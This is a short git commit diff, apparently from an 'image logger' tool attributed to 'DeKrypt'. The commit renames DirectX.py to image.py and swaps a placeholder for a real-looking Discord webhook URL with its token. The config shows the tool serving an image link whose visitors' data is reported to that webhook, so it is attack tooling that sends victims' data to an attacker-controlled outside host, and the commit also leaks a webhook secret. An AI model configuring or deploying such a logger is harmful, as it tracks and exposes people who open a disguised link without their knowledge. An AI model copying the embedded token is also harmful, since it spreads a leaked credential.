3ba219e3b6bdefba6cb7a3c51bcde7838d508f3f
snecsy123 <Snecsy@gmail.com>
2025-03-08 01:41:21 +0100

    Update and rename DirectX.py to image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
+    "webhook": "https://discord.com/api/webhooks/1347729441094111332/-MMhGGw_7TUmkOkWWBNvOlalkkkEGs1jkYSeiosBOtWwqP3SZyc9K2QUXeOLDdz0gIwW",
     "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
